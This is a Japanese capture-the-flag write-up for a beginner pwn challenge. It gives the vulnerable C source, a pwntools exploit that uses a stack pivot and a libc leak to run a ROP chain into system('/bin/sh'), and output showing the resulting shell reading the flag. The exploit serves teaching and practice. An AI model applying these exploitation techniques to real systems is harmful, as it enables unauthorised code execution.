## pivot4b (394pt / 117 solves) [medium]
> スタックはあなたが創り出すものです。
>
> nc [問題鯖のホスト名] [ポート番号]

恐らく解くのに最も時間が掛かった問題で、かつ解けたのがそれなりに嬉しかった問題。

次に示すソースコードが与えられている。
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gift_set_first_arg() {
	asm volatile("pop %rdi");
	asm volatile("ret");
}

void gift_call_system() {
	system("echo \"Here's your gift!\"");
}

int main() {
	char message[0x30];

	printf("Welcome to the pivot game!\n");
	printf("Here's the pointer to message: %p\n", message);

	printf("> ");
	read(0, message, sizeof(message) + 0x10);

	printf("Message: %s\n", message);

	return 0;
}


__attribute__((constructor)) void init() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(120);
}
```

read関数を見ると、明らかにバッファオーバーフローが可能なつくりにはなっているものの、`0x10`バイト分しか余裕がない。gdb-pedaで実験してみたところ、リターンアドレスよりも下のスタック領域は書き換えることができなかった。これではsystem関数に引数を与えることができない。  
こんな時に有効なのがstack pivotというテクニック。leave命令でrspを書き換えてより広い領域を指すようにし、そこをスタックとして利用する、というのが基本の考え方となる。私はこの問題で初めてstack pivotに触れることになった（加えて、ROPもあまり経験がない）ので、[詳解セキュリティコンテスト](https://ctfbook.github.io/2nd/)やstack pivotに関する情報が載っているブログ記事、そしてgdb-pedaとにらめっこしながらソルバを書いた。その内容を以下に示す。
```python
from pwn import *

target = './chall'

context.os = 'linux'
context.arch = 'amd64'
context.binary = target

binary = ELF(target)
libc = binary.libc
addr_pop_rdi = 0x40117a
addr_system = 0x40118d
addr_leave = 0x401211
addr_binsh = 0
addr_msg = 0

proc = remote(hostname, port)

proc.recvuntil('Here\'s the pointer to message: ')
addr_msg = int(proc.recvline()[2:14].decode(), 16)
payload_1 = pack(addr_pop_rdi)
payload_1 += pack(binary.got['puts'])
payload_1 += pack(binary.plt['puts'])
payload_1 += pack(binary.symbols['main']+1)
payload_1 += b'A' * 0x8
payload_1 += pack(binary.symbols['main']+1)
payload_1 += pack(addr_msg - 8)
payload_1 += pack(addr_leave)

proc.sendlineafter('> ', payload_1)

proc.recvline()
libc_leak = int.from_bytes(proc.recvline()[0:-1], 'little')
libc.address = libc_leak - libc.symbols['puts']

addr_binsh = next(libc.search('/bin/sh\x00'))
payload_2 = pack(0x40101a)
payload_2 += pack(addr_pop_rdi)
payload_2 += pack(addr_binsh)
payload_2 += pack(addr_system)
payload_2 += pack(addr_binsh)
payload_2 += pack(addr_binsh)
payload_2 += pack(addr_msg - 8)
payload_2 += pack(addr_leave)

proc.sendlineafter('> ', payload_2)
proc.interactive()
```

このソルバの流れとしては、
1. 配列msgにlibcのベースアドレスをリークさせるための命令を積む
2. leave命令で配列msgの先頭-8バイトのアドレスをrspに格納する
3. ret命令でmsgの先頭にrspが移る
4. puts(puts@GOT)でputs関数のGOTアドレスを手に入れ、main関数の先頭から1バイト先の位置に戻る（1バイト先の位置に戻っているのは、スタックのアラインメントを合わせるため）
5. 手に入れたGOTアドレスからlibc内のputs関数のオフセットを引き、libcのベースアドレスを算出しておく
6. 更にもう一度main関数の先頭から1バイト先のところに戻り、ユーザ入力を可能にする
7. 再び配列msgの内容を書き換える。今度はsystem関数を実行するための命令を積む
8. 再度leave命令からのret命令でmsgの先頭にrspを移す
9. '/bin/sh'を引数にしてsystem関数が実行、すなわちシェルが起動する

......こんな感じだったと思う。「思う」というのは、このソルバはああでもないこうでもない、と頭をひねりながら色々やっていたらなんかできた！って感じのものなので、細部まで説明するのが難しい。例えば6.はどうしてそうしているのか、自分でも思い出せなくなってしまった。（確かこうしないとrspがずれてアドレスが正しく解釈されない、みたいな感じだったとは思う）  
なお、ROP gadgetとsystem関数のアドレスはソースコード内にギフトとして与えられているので、それを利用している。  
何にせよ、このソルバを通すとフラグが得られた。
```
$ python3 solver.py
[+] Opening connection to [hostname] on port [port]: Done
poc.py:30: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  proc.recvuntil('Here\'s the pointer to message: ')
140720973439520
/usr/local/lib/python3.10/dist-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
poc.py:48: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  addr_binsh = next(libc.search('/bin/sh\x00'))
[*] Switching to interactive mode
Message: 

Welcome to the pivot game!
Here's the pointer to message: 0x7ffe223c3ee0
> Message: \x1a\x10@
$ ls
flag-bce7759151aa98ff2e61358f578ec2eb.txt
run
$ cat flag-bce7759151aa98ff2e61358f578ec2eb.txt
ctf4b{7h3_57ack_c4n_b3_wh3r3v3r_y0u_l1k3}
```

### `ctf4b{7h3_57ack_c4n_b3_wh3r3v3r_y0u_l1k3}`
